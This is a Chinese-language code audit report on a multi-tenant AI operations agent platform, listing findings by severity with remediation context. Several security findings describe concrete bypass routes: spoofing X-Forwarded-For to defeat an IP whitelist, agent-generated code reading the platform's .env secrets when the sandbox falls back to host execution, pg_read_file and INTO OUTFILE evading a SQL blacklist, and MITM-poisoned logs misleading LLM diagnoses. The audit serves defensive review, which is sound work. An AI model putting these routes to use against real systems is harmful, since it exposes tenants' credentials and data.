- **422 校验错误被当作字符串提示，64 处会渲染成 [object Object]** · `前端` · 采纳成本 *easy*
  任何 pydantic 校验失败（邮箱格式、端口类型、必填字段、scope 枚举）在前端只弹出一个 `[object Object]` 或空提示，用户完全不知道哪个字段错了——而本平台表单极多（服务登记、通知配置、Token scope、巡检间隔、重启策略），这类错误是最高频的交互路径。影响面是所有表单页，且因为提示无意义，用户会反复重试同样的错误输入。
- **轮询与筛选/翻页切换缺少请求取消，慢响应会覆盖新状态** · `前端` · 采纳成本 *moderate*
  (1) 快速切换消息状态标签（全部/未读/通知失败/分析失败…）或连续翻页时，先发出的慢响应后到会覆盖后发出的快响应，页面列表与实际筛选条件不一致——运维可能据此误判「这条告警已解决/已读」。(2) 在未读/审批等高频接口上，标签页挂后台仍持续打请求；如果页面同时监控 N 个系统的指标（useMetricsPolling 是按系统实例化的），请求量随系统数线性放大，会对后端与采集器造成持续无效负载。
- **生产接入凭证页的示例命令丢失域名：`??` 对空字符串不生效** · `前端` · 采纳成本 *easy*
  「系统接入」页是第三方系统对接的唯一入口，用户复制出去的 6 段 curl 示例全部无主机名，在任何终端都必然失败（`Could not resolve host`），而且失败信息不会指向「示例命令错了」，接入方通常会先怀疑自己的网络或鉴权，从而显著拖长接入周期。这是纯前端可复现缺陷，与后端无关。
- **无 TypeScript、无 lint、无测试、无 CI，已出现 lint 能一秒捕获的真实缺陷** · `前端` · 采纳成本 *moderate*
  前后端契约完全靠约定：`business_context.answer_stream`、`report.execution_result`、`data.items ?? data` 这类手写归一化散布在 40+ 文件里，后端字段改名或层级调整时前端不会报错，而是静默降级为「空列表/空字符串」——在运维场景里这等于「看起来一切正常」，误导性远大于报错。加上 17.8k 行无类型代码与两份漂移中的常量表，任何一次重构都要靠人工全量回归，交付…
- **通知 Webhook URL 被当作非密文，明文回显在系统详情页** · `前端` · 采纳成本 *easy*
  飞书/钉钉/Slack 的群机器人 Webhook 是「持有即能用」的凭证，拿到就能向生产告警群发送任意内容（包括伪造告警、诱导误操作）。现在任何能打开该系统详情页的成员都能看到明文，并且它会出现在浏览器 DOM、截图、录屏、前端日志里；轮换也只能靠人工改配置，没有「已配置/重新输入」的 write-only 语义。
- **危险渲染函数在模板里直接调用，流式输出期间反复重解析全部历史 Markdown** · `前端` · 采纳成本 *easy*
  一次诊断会持续几十秒到十几分钟、期间产生几十到上百次事件；每次事件都会对列表里**每一条**历史消息重跑一遍 markdown 解析 + DOMPurify 净化，复杂度是 O(消息数 × 文本长度) 且随会话增长。长会话下会出现明显掉帧、滚动与输入卡顿，而这恰好发生在用户正在应急处置的时间窗内。
- **外部 MCP server 子进程继承平台全量环境变量，第三方工具可直接拿走平台密钥** · `安全与权限` · 采纳成本 *easy*
  任何被配置进来的 MCP server（自研脚本、供应商 SDK、被供应链投毒的包）以及它 `args` 指向的任何可执行文件，都可以读到平台进程环境里的 `DEEPSEEK_API_KEY`、`FEISHU_APP_SECRET`、`DATABASE_URL`（含口令）、`ENCRYPTION_KEY`（一旦按发现 5 设上，就等于把解密主密钥一起给出）、以及 `JWT_SECRET` —— 即一次性拿到平台全部信任根。这从「MCP …
- **系统 token 的 IP 白名单基于可伪造的 `request.client.host`，形同虚设** · `安全与权限` · 采纳成本 *moderate*
  `allowed_ips` 是外部系统 token 唯一的地理/网络约束，可被 `X-Forwarded-For: <任意IP>` 一行绕过——token 一旦泄漏（日志、客户代码库里的硬编码、`X-System-Code`+token 的组合被截图）就完全不受来源限制。同时在同一条链路上，任何基于 IP 的审计/风控（如果有）都会记录伪造地址。
- **代码沙箱在没有 docker CLI 时静默降级为宿主进程执行，模型生成的代码可读平台 `.env`** · `安全与权限` · 采纳成本 *moderate*
  在无 docker CLI 的部署形态下，`run_python_analysis` 生成的脚本以平台进程用户身份在宿主/应用容器内执行，可以 `open('/Users/.../ai-ops-agent/.env')` 读走 `DEEPSEEK_API_KEY`/`FEISHU_APP_SECRET`/`DATABASE_URL`，可以读 `config.py`、直接连 Postgres、或把结果写进产出文件再通过免登录下载链接（`a…
- **版本控制基线不可信：核心架构只存在于未提交的工作区，默认分支也不是真实代码** · `工程质量` · 采纳成本 *-*
  `origin/feat/multi-tenant-aiops-platform` 与 HEAD 同步，意味着**工作区里这批东西在远端不存在**——harness/runtime 这套当前架构的核心、6 个新迁移、整个测试与 CI 的删除动作，都只有一份副本在地盘上；磁盘故障即等于 1865 行核心架构与迁移历史永久丢失（这是本报告里唯一符合"数据丢失且无缓解"的路径）。次生影响：任何人 `git clone` 默认分支拿到的是 3.…
- **SQLite 兜底 schema 是第二套手写迁移，且已与 alembic 漂移** · `工程质量` · 采纳成本 *-*
  触发条件是"已有 dev.db 的机器升级到当前代码"。`create_all` 只补缺失的**表**，不会给已有表加列，于是任何读取 `diagnosis_reports` 的路径都会在运行期抛 `OperationalError: no such column: diagnosis_reports.business_context`——平台在本地/演示/POC 形态下直接不可用，且报错点远离根因（模型定义处）。影响面：所有沿用旧 S…
- **无 ruff/mypy/ESLint 配置：105 处 noqa 是死配置，类型注解从不被校验** · `工程质量` · 采纳成本 *-*
  `# noqa` 的存在说明作者清楚 BLE001 是风险（"我知道这里在吞异常"），但没人执行时它既不能阻止新增盲捕，也不能阻止有人在没有 `noqa` 的地方继续加——现状正是如此（16 处整段 `pass`，只有一部分带注释）。类型注解随重构失真是静默的：本仓刚把 `runner.py` 拆成 `runner.py` + `harness/*`（17 个模块），这类改造最容易留下过时注解，而 65% 的注解覆盖率又足以让人误以为"…
- **依赖约束全为开区间下限、零 CVE 扫描机制、基础设施镜像用 latest** · `工程质量` · 采纳成本 *-*
  约束层完全不设防，安全性 100% 依赖"每个人都记得提交锁文件"这一纪律；而本仓另一条 finding 已证明生产镜像会绕过锁——两者叠加后，一条上游被投毒或回归的 release 可以零审查进入生产。触发条件不需要攻击者：`langfuse` 3→4 或 `langgraph` 0.2→1.x 这种大版本跳变在本仓已发生过（并伴随 `51dad11` 的 3 个启动期 bug），任何一次重建镜像都可能重现。影响面覆盖全部容器组件与客…
- **巨型编排函数把"不可测"固化进了架构核心** · `工程质量` · 采纳成本 *-*
  377 行的单函数无法被单元测试有效覆盖——任何用例都得驱动整条链路（工具、DB、模型），这正是"没有 harness/runtime 测试"的结构性原因；也因此每次改动都只能靠端到端手工验收（历史提交里"真机验收""实测"字样频繁出现，成本已经显性化）。触发条件：任何需要修改诊断编排的改动（新增工具类别、调整降级顺序、改预算口径），改动风险与回归面无法局部化。
- **报告列表/对话接口对每条记录做重活：历史反序列化 + 账本全表求和 + 逐条查询（N+1）** · `应用服务与 API` · 采纳成本 *moderate*
  `GET /diagnosis-reports?limit=50` 会触发 50 次"MB 级消息历史 JSON 反序列化 + 全账本扫描 + 逐行 get"，单请求可到秒级、数百 MB 瞬时内存；对话历史页与外部 OpenAPI 轮询（`created_at desc` 排序后立刻 `reverse()`，`reports.py:137`）会周期性重复这个开销。同步 `def` 端点跑在 anyio 线程池（默认 40 槽）里，几个并…
- **请求路径上做同步阻塞聚合：metrics/patrol 串行外呼，无超时预算，可把控制台线程池占满** · `应用服务与 API` · 采纳成本 *moderate*
  `GET /systems/{id}/metrics` 与被前端仪表盘定时轮询，一个 20 个 http 服务的系统就可能阻塞一个请求线程上百秒；这些同步 `def` 端点共享 anyio 默认 40 线程池，同时打满后 `/auth/login` 等所有同步接口一起排队——可观测到的"平台整体卡住"往往源于此。且没有任何请求级超时/取消，客户端断开也不会中断底层调用。
- **诊断证据用"读整段 JSON→改→写回"落库，8 线程工具池并发写会丢证据** · `应用服务与 API` · 采纳成本 *moderate*
  两个线程同时"读→改→写"同一 JSON 列，后提交者覆盖先提交者（无行锁、无版本号），被覆盖的工具调用会从 `evidence` 里消失——终态 `_finalize_report` 会用 `result.evidence` 整体覆写（`service.py:610`）所以最终可能有全量，但**运行中的实时证据面板**（`answer_stream`/SSE 快照的数据源）会随机缺步骤，且异常/关停路径下（终态未写入时）这些丢失就是永…
- **效率分析把整个 org 的消息与审计日志拉进内存做 Python 聚合** · `应用服务与 API` · 采纳成本 *moderate*
  审计日志是**每次工具调用都写一条**（`service.py:1294-1310` 的 `agent.tool` 事件），一个活跃租户 90 天的 `audit_logs` 很容易到十万～百万行，每行还带 `input`/`output` 两个 JSON（诊断的 output 含整段答案与 tool_calls）。这个接口会：拉取数百 MB 到 API 进程内存 → 有 OOM 风险；同步遍历期间占住一个线程池槽很久；同一 org 的…
- **归档下载端点忽略租户校验，而它的 token 会随答案进入第三方 LLM 与审计日志** · `应用服务与 API` · 采纳成本 *moderate*
  工具结果整体发给外部模型供应商，等于把"下载凭据"外发给第三方；答案/审计里出现的链接也可能被转发、贴进工单或飞书群。任何人拿到这个 32 位 token 就能下载客户归档文件（可能是日志、任务产物），且端点不看 `system_id`、无鉴权、目录全局共享——一旦 token 泄漏就是跨租户任意文件读取。
- **Celery 队列与重试语义过于粗糙：无全局 acks_late/time limit、固定 10s 重试、大正文进 broker** · `应用服务与 API` · 采纳成本 *easy*
  (1) 默认 early-ack：worker 被 OOM/SIGKILL 时消息已 ack → 日志分析/消息处理任务静默丢失（诊断任务单独配了 `acks_late=True`，见 `backend/app/workers/diagnoses.py:5-6`，说明团队知道该怎么做，只是没推广）；(2) 无时间限制：一个卡住的任务永久占住 prefork 槽位（诊断链路靠 `threading.Timer` 和 reaper 兜底，但…
- **索引命名与覆盖范围在模型和迁移之间系统性漂移，autogenerate 的 diff 已不可信** · `数据模型与迁移` · 采纳成本 *moderate*
  只要有人跑一次 autogenerate，产出的是一个几十行的「加 20 个同名不同后缀的索引 + 删 20 个旧索引」的巨型 diff。真实后果有两层：(1) 这种 diff 没人会仔细审，第 1 条 finding 的 DROP 语句就藏在里面被一起放过——这是「高危项能长期存在」的直接原因；(2) 若真的执行，`CREATE INDEX`（非 CONCURRENTLY）会在大表上持 ACCESS EXCLUSIVE 锁，配合启动期…
- **删除「系统」在有历史数据时必然 500：全库没有任何 `ON DELETE` / 级联，前置校验只检查了 services** · `数据模型与迁移` · 采纳成本 *moderate*
  触发路径是**被前置校验逼出来的常规操作**：运维想删系统 → 先删掉全部 service（`services/systems/lifecycle.py:240` 是硬删）→ 再删系统 → `audit_logs.system_id` / `diagnosis_reports.system_id` / `collectors.system_id` 中任意一张有行就抛 FK 违例 → 500。而 `audit_logs` 在诊断、日志分析…
- **`business_context` 一个 JSON 字段承载 9 种互不相关的语义，其中路由键 `chat_id` 被用在无表达式索引的 JSON 过滤里；且列对话时会「读一次写一次」** · `数据模型与迁移` · 采纳成本 *moderate*
  租户级放大——对话详情、重命名、删除（`chats.py:111` 走同一个 `_reports`）每次都要对 `diagnosis_reports` 做一次按 `org_id`+`system_id` 过滤后再逐行做 JSON 成员比较的全表/大范围扫描，`created_at` 索引帮不上忙；报告量上万后对话页打开变慢、删除对话可能超时。`backfill_legacy` 让「列对话」变成写操作，并发打开两个对话页会互相覆盖 `bu…
- **状态机取值没有任何数据库约束，且词表已在多个文件之间漂移（出现永不写入的 `completed` 幽灵状态）** · `数据模型与迁移` · 采纳成本 *easy*
  状态机是「散落在 6 个文件里的字符串字面量 + 一个 Python 元组」，schema 对此一无所知。任何一处拼写错误（例如把 `failed` 写成 `fail`、把 `running` 写成 `Running`）都会静默写进库并产生一个**没有读者认识的状态**：该报告的 reaper 不认它（`reaper.py:39` 起按状态收敛）、不再出现在 `RESUMABLE_STATUSES` 里、前端既不显示成功也不显示失败，而…
- **时间戳一半是 `timestamptz`、一半是 `timestamp`，应用把 aware UTC 写进 naive 列，且容器未固定 DB 时区** · `数据模型与迁移` · 采纳成本 *moderate*
  Postgres 把 aware 值写入 `timestamp without time zone` 列时，会先按会话 `TimeZone` 换算再存裸值。当前 PG 官方镜像通常落在 UTC 上，所以今天是「恰好正确」；一旦 DB 容器/托管实例的 `TimeZone` 不是 UTC（RDS 默认常随参数组变化、自建库常见 `Asia/Shanghai`），所有 `timestamp` 列会整体偏移 8 小时，并且**读回来是 nai…
- **唯一性只在应用层检查，数据库没有约束；SQLite 兜底路径的 FK 完全形同虚设** · `数据模型与迁移` · 采纳成本 *easy*
  (a) `systems.key` 是外部 OpenAPI 的身份解析键（`api/openapi.py:71` 用 `get_system_by_key(session, token.org_id, system_code)`），重复 key 会让同一 org 内两个系统互相「抢」同一个 `system_code`，`token.system_id != system.id` 的分支（`openapi.py:72-73`）随机返回 4…
- **迁移在进程启动时执行、无锁、一次部署执行两次，且全部 revision 在同一事务里用非 CONCURRENTLY 建索引** · `数据模型与迁移` · 采纳成本 *moderate*
  (a) 多副本/滚动发布时两个 API 进程会并发执行 DDL——`CREATE INDEX`/`CREATE TABLE` 竞态会抛 `relation already exists` 或 `duplicate key value violates unique constraint "alembic_version_pkc"`，结果是**进程启动失败**，而不是某个人工操作的失败；`docker compose up --scale…
- **`/healthz` 恒返回 ok 却被当作 readiness 门禁，worker/beat/web 完全没有健康检查** · `部署与运维` · 采纳成本 *easy*
  进程活着但依赖已坏时（PG 连接池耗尽、Redis broker 不可达、`init_db()` 之后的连接被防火墙切断），`/healthz` 依然 200，于是：① Docker 不会重启真正不可用的 api 容器；② worker/beat/web 会在这个"假健康"之上被放行启动，把"依赖顺序保护"变成形式；③ 外部探活（cloudflared 安装脚本、任何基于该路径的监测）持续报告健康，故障对运维不可见，只表现为用户侧 5x…
- **平台 Redis 既无持久化也无数据卷，重启即丢未消费任务，且 broker 与 result backend 共用同一实例** · `部署与运维` · 采纳成本 *easy*
  Redis 容器一旦重启/被 OOM Kill/`docker compose up -d` 重建（无卷意味着容器重建 = 数据全清），队列中所有尚未被 ACK 的任务直接消失：`health_check_all_systems` 的巡检缺口、`daily_health_reports` 的漏发、通知重试丢失，而且因为预取即刻 ACK，Celery 自己也不知道丢过什么，没有任何重投或死信兜底。诊断路径因为另有"DB outbox + …
- **可观测性只有基础设施一层：平台自身无指标、无告警规则、无日志轮转，且日志每次启动即被清空** · `部署与运维` · 采纳成本 *moderate*
  故障发现完全依赖用户报障：API 5xx 率、诊断失败率/token 消耗、Celery 队列积压、DB 连接池耗尽这些最关键的信号既不被采集也不被告警；Prometheus 部署了却不产生任何行动，属于"有监控无观测"。
- **Nginx 默认 1MB 请求体上限与 API 声明的 2MB 日志上传冲突，且 API 侧对上传大小没有任何校验** · `部署与运维` · 采纳成本 *easy*
  ① 合法流量被拒：1–2MB 的日志文件经容器化入口上传会得到 nginx 的 `413 Request Entity Too Large`，而 API 文档和调用方（`openapi.py:414` 的描述）都承诺支持 2MB——这是规格与实现不一致导致的确定性功能缺陷，且只在容器化拓扑出现，又一处开发栈与生产栈的行为分歧。② 无上限读入内存：任何能绕过 nginx 直连 API 的调用方（内网、隧道上的 `webhook.*` 域名…
- **中间件使用明文弱口令且端口全绑 0.0.0.0，macOS 宿主上等于对局域网开放数据库与消息队列** · `部署与运维` · 采纳成本 *easy*
  这些端口绑定在宿主机的所有接口上（Colima/Docker Desktop 的默认端口转发行为），因此同一局域网/同一咖啡馆 Wi-Fi 内的任何主机都可以用 `root/rootpass` 直连到含有真实业务数据的 MySQL、无密码直连 Redis（可写 Celery 队列、可篡改缓存）、以及 RabbitMQ 管理台。这类"开发机带着生产数据接入不可信网络"的场景在运维平台里尤其危险：被监控系统的只读库凭据也在 `descrip…
- **采集器重连时旧连接的 finally 会注销新连接，被误判为「离线」** · `采集器与连接器` · 采纳成本 *easy*
  网络抖动/TCP 半开时，服务端旧协程可能还没发现对端已死；采集器按 `ping_interval=30, ping_timeout=10`（`collector/ws_client.py:429`）判定超时后重连并写入新的 `_conns[id]`；随后旧协程从 `receive_json()` 抛错退出，`finally` 把**新连接**从表里删掉。结果：采集器明明连着，平台侧 `is_connected()` 为假，`_requ…
- **run_readonly_query 靠正则黑名单，可绕过（INTO OUTFILE / pg_read_file），且无只读事务与语句超时** · `采集器与连接器` · 采纳成本 *moderate*
  `ro_readonly` 账号若带 `FILE`/`pg_read_server_files`/超级用户角色，"只读"立刻变成"在客户 DB 主机上写文件/读任意文件"，是典型的黑名单绕过→RCE 路径。即使权限不足，`SELECT pg_sleep(3600)` 或一条大表全扫也会在**没有语句超时**的情况下把连接挂住，而采集器的命令循环是串行的（见下一条），最终表现为"采集器在线但什么都不响应"。
- **下行命令单线程串行执行，无 deadline/取消/幂等；平台 30s 超时后命令仍在内网继续跑** · `采集器与连接器` · 采纳成本 *moderate*
  （1）队头阻塞——一条慢 SQL 或一个卡住的 `docker exec` 会让采集器在几十秒到无限期内不处理任何后续命令，平台侧表现为大面积超时，Agent 会把"采集器坏了"写进诊断结论，误判根因；（2）超时竞态——`run_kafka_command`/`restart_*` 的 30s 与平台 30s 完全相等，命令大概率在平台宣告失败之后才真正完成，重启型动作尤其危险（平台说失败、实际已重启）；（3）无幂等键，调用方重试就会重…
- **无协议版本握手与升级机制；命令白名单在平台侧漂移，query_prometheus_range 实际不可用** · `采集器与连接器` · 采纳成本 *moderate*
  平台先升级、采集器没升级是常态（客户现场机器不会自己更新）。老采集器收到新命令只会回 `未知命令: xxx`（`ws_client.py:270`），而平台把 `result` 原样交给 LLM/用户（`exec.py:55-59`），模型很可能把"客户端不支持"当成"该指标不存在"写进诊断结论。反向更糟：`query_prometheus_range` 在公开 API 被 400 拒（`exec.py:38-40`）而在内部路径能用，…
- **断线期间探测结果直接丢弃、无本地缓冲回补；密钥失效的采集器会永久无限重连** · `采集器与连接器` · 采纳成本 *-*
  平台升级/网络割接/客户防火墙抖动期间的健康历史会出现空洞，且平台无法区分"采集器没数据"和"服务全挂"（`last_health` 停留在旧值，`backend/app/services/monitoring/health.py:16-29` 只能靠陈旧度给"采集器长时间未上报"）。被删除或密钥轮换掉的采集器会持续每 60s 敲一次平台、每次打一条 403 日志，永久占用连接与日志噪声，运维无法从日志判断"这是废弃节点还是攻击探测"。…
- **SSH 连接器 accept-new 无 known_hosts 固定，重启依赖 NOPASSWD sudo** · `采集器与连接器` · 采纳成本 *easy*
  `accept-new` 的信任模型是"首次见到即接受"（TOFU），首次连接或 known_hosts 尚未写入时，同网段的中间人可以把平台的探活结果与日志读取重定向/伪造——采集器把攻击者提供的文本当作"客户生产日志"回传，形成数据投毒（会直接污染 LLM 诊断结论与告警）。`identity_file` 由平台下发的路径决定（描述符平铺），意味着任何能改服务配置的人可以让 ssh 用采集器主机上**任意**可读私钥去连（配合下一条…
- **不强制 TLS：PLATFORM_URL 由 request.base_url 推导，明文 http/ws 也能上线** · `采集器与连接器` · 采纳成本 *easy*
  只要控制台是通过 http 访问的（本机 `http://127.0.0.1:8000`、Caddy `:80`、内网明文入口），生成的采集包就会用 `http://` + `ws://`，于是：收集到的客户生产日志、`run_readonly_query` 返回的数据库行、下发给采集器的**明文 DB 密码与凭据**全部在网络上明文传输，同时上一节说的密钥也顺带明文落地。默认值 `http://localhost:8000` 让"临时…

### Low — 改进项

- **按子串逐行删除工具说明的提示词手术会留下孤立指令，并使 Pi 试点结论不可比** · `Agent 核心` · 采纳成本 *moderate*
  受限工具集下模型拿到语义不完整、含孤立指涉的指令，可能表现为反复尝试调用不存在的委派能力、或在『只读诊断』语境下错误引用被删掉的写操作说明；更关键的是 Pi 试点与 Pydantic 基线用的不是同一份提示词，导致试点结论（质量、成本、工具选择行为）无法归因——无法区分差异来自引擎还是来自提示词裁剪。触发条件就是启用 Pi 或任何 allowed_tools 受限的调用（MCP Server 路径也传 allowed_tools=EVI…
- **证据守卫的 caveat 文案是死代码，函数行为与文档承诺不一致** · `Agent 核心` · 采纳成本 *easy*
  影响有限但会误导维护者：任何按注释理解 apply_evidence_guard 的调用方（期望 answer 文本被追加警示）都会得到无标注的原文；若前端改动或某条消费路径不读 business_context（例如导出报告、IM/飞书推送回答原文的通道），未取证告警会彻底消失，而代码看上去仍在正常工作。属于会误导后续修改、并可能在传递链路变化时静默丢失安全提示的技术债。
- **可访问性覆盖稀疏：移动抽屉缺对话框语义与焦点管理，图标按钮缺可读名称** · `前端` · 采纳成本 *easy*
  键盘与读屏用户无法可靠地打开/关闭移动导航，也读不出图标按钮与主题色点的用途；对有键盘操作习惯的运维人员（终端重度用户）在应急场景下是实实在在的效率损失。目前无外部合规硬要求，因此定级 low，但成本极低。
- **全站文案硬编码中文，无 i18n 层且日期格式化口径已不一致** · `前端` · 采纳成本 *moderate*
  一旦需要英文界面或跨区域交付，要改动 40+ 个文件且无法灰度发布；即便不出海，「同一页面出现两种日期格式」这类不一致也会降低控制台的专业度。属于可预见的技术债而非当前故障，故定级 low。
- **打包策略把 antd 全量归入单一 vendor chunk，首屏固定承担 217KB gzip** · `前端` · 采纳成本 *easy*
  首屏固定承担 217KB gzip 的组件库，弱网/移动端 TTI 明显变长；而且这是单调恶化的——每加一个 antd 组件都不会增加「按需」边界，只会让这个 chunk 继续变大。由于 Caddy 已开启 zstd/gzip 且资源有 hash 长缓存，二次访问体验尚可，因此定级 low。
- **登录无速率限制与锁定、注册完全开放、密码无强度要求，JWT 也没有吊销机制** · `安全与权限` · 采纳成本 *easy*
  开放注册 + 无限次密码尝试，使「拿到一个平台账号」的门槛很低；配合发现 1 的伪造 token 或发现 6 的越权 SQL，一个自助注册的 owner 就能进入多租户平台并注册指向内网地址的系统（`health_url`/`webhook_url` 无任何地址校验，`schemas/systems.py:60-63` 只校验 `http(s)://` 前缀），从而获得对平台可达内网的盲 SSRF 探测与 webhook 外发能力。to…
- **SSH 连接器采用 trust-on-first-use，且远端命令由注册配置拼接进 shell** · `安全与权限` · 采纳成本 *moderate*
  首次连接（或 known_hosts 被清空/容器重建后）可被中间人劫持，攻击者取得主机密钥后即可解密后续「只读」流量（日志内容常含业务数据/凭据片段）并冒充被监控主机应答；`health_cmd`/`log_path` 由 operator 注册，写入等价于在被监控主机上执行任意远端命令（这是产品能力，但缺少任何语法/模板约束，误配或越权注册即远端 RCE）。`replace("'", '')` 这类"过滤"在换行/反引号等场景下的行…
- **日志风格混用且全部为非结构化文本** · `工程质量` · 采纳成本 *-*
  f-string 在日志级别被过滤时仍会构造字符串，本仓诊断热路径（`runner.py`、`service.py` 各数百行日志调用）上属于无谓开销；无结构字段意味着无法按 `org_id`/`report_id`/`run_id` 在日志系统里过滤聚合——而本平台恰好是每租户每报告都要追溯的场景，`main.py:27-29` 的注释也说明"诊断耗时、token、缓存命中、成本"都靠日志输出，即关键业务可观测性全押在这套文本日志上。
- **文档资产齐备但缺许可证与贡献指南，唯一的架构文档还没入库** · `工程质量` · 采纳成本 *-*
  ①交接/评审场景下，唯一成体系的架构文档（575 行，`ARCHITECTURE.md`）只存在于本机，随工作区丢失；②无 LICENSE 会在开源或客户安全评审/采购流程里直接卡住（`collector/` 是要交付到客户内网的组件，客户法务通常会要许可证声明）；③无 CONTRIBUTING 且 README 不提测试，新人无法自证改动正确，质量退化缺少制度入口。
- **只读业务数据源没有语句超时：配置里的 `timeout_seconds` 对非 SQLite 完全不生效** · `应用服务与 API` · 采纳成本 *easy*
  客户只读库上一条慢查询（大表 `COUNT(*)`、缺索引的 `ORDER BY`，`data_analysis.py:100-108` 与 `:187-218` 会生成这类 SQL）会把 Agent 的工具调用挂住，链路里唯一的边界是诊断运行的 600s 超时（`backend/app/services/diagnostics/jobs.py:17` 的 `RUN_SECONDS`），期间该会话的预算一直被占、worker 槽位被占；…
- **LangGraph checkpointer 的 3 张表由 `saver.setup()` 在启动时创建，完全游离在 Alembic 之外** · `数据模型与迁移` · 采纳成本 *moderate*
  `alembic downgrade` 回退版本时这些表会残留并被旧代码误读（schema 与代码版本不匹配），迁移审计/灾备演练时会漏掉这部分数据；更现实的是升级 `langgraph-checkpoint-postgres` 可能悄悄 `ALTER` 这几张表——一次「只改了依赖版本」的发布就此改变 schema，而变更记录里看不到。「挂起的审批跨重启存活」这条业务语义（`runner.py:1-10` 注释）就建立在这些表上，属于…
- **SQLite 兜底是一套手写的第二迁移实现，已与模型漂移（缺 `business_context` / `external_request_id`）** · `数据模型与迁移` · 采纳成本 *easy*
  影响面是**开发/兜底环境**，不是生产 PG。已有 `dev.db` 的开发者升级代码后，`business_context` 不会被补上，而它出现在大量读路径的 SQL 里（`chats.py:40` 的 JSON 过滤、`reports.py:83,91,94`、`usage.py:128,442`），会直接抛 `sqlite3.OperationalError: no such column: diagnosis_reports…
- **分发链硬化不足：容器以 root 运行、依赖完全不锁版本、基础镜像浮动 tag** · `采集器与连接器` · 采纳成本 *easy*
  客户内网以 root 运行、且依赖版本每次重装都可能变化的 Agent，是供应链攻击的高价值目标（`psycopg2-binary` 自带 libpq，安全更新滞后于系统 libpq，官方文档本身就建议生产环境用源码版）。升级不可复现（同一份包在不同时间装出不同依赖），出故障时无法回滚到确定版本；`docker.sock` 的两种极端（不挂就用不了、挂了就等同宿主 root）没有在文档里讲清，客户会自己踩坑并留下一个比预期大得多的权限面…

---

## 附录 A · 分维度详细报告

每条都包含完整的「证据（文件:行号）→ 风险 → 业界做法 → 可采纳性 → 建议」，以及针对 critical/high 的**对抗性复核记录**。

| 报告 | 维度 | 发现数 | 内容摘要 |
|---|---|---:|---|
| [`audit/agent-core.md`](audit/agent-core.md) | Agent 核心 | 9 | 工具网关与目录、执行追踪、预算、证据校验、委派、Pi 桥接、知识库、MCP、审批工作流 |
| [`audit/services-api.md`](audit/services-api.md) | 应用服务与 API | 11 | 诊断编排、事务与并发、Celery 语义、N+1、性能 |
| [`audit/data-model.md`](audit/data-model.md) | 数据模型与迁移 | 11 | 多租户隔离、索引与约束、级联、迁移可回滚性、时区 |
| [`audit/security.md`](audit/security.md) | 安全与权限 | 11 | 认证授权、密钥管理、注入面、沙箱、内部端点 |
| [`audit/deploy-ops.md`](audit/deploy-ops.md) | 部署与运维 | 11 | 健康检查、自愈、备份、关停、可观测性、Nginx |
| [`audit/engineering.md`](audit/engineering.md) | 工程质量 | 10 | 测试与 CI、依赖锁定、静态检查、文档 |
| [`audit/frontend.md`](audit/frontend.md) | 前端 | 12 | 令牌与 XSS、SSE 实现、错误处理、性能、可访问性 |
| [`audit/collector.md`](audit/collector.md) | 采集器与连接器 | 12 | 认证与密钥、信任边界、TLS、命令下发、断线行为 |

## 附录 B · 关于本报告

- **口径**：severity 判定标准为 `critical`=会导致数据丢失/越权/生产不可用/资损且当前无缓解；`high`=明确会导致故障或安全事件；`medium`=显著技术债；`low`=改进项。
- **脱敏**：报告中出现的真实凭据（LLM API key、飞书 app secret、采集器密钥、系统令牌）已全部替换为掩码。**原始值仍存在于 `.env`、`scripts/stack-launcher.sh` 与 `.dev-stack/logs/` 中，请按第六节的"今天"清单处理。**
- **复核机制**：所有 critical/high 都经独立 agent 以"尽力证伪"的方式复核；4 条 critical 全部 `confirmed`，6 条 high 被下调为 medium（原因已记录），无 high 被完全证伪。
- **本报告自身也是产物**：建议在修完"今天"四项后重新跑一次体检，对比严重度分布；长期看应把其中可机械化的检查（密钥扫描、`uv sync --frozen`、构建门禁、租户键一致性）**固化成 CI 门禁**，而不是靠下一次人工体检。
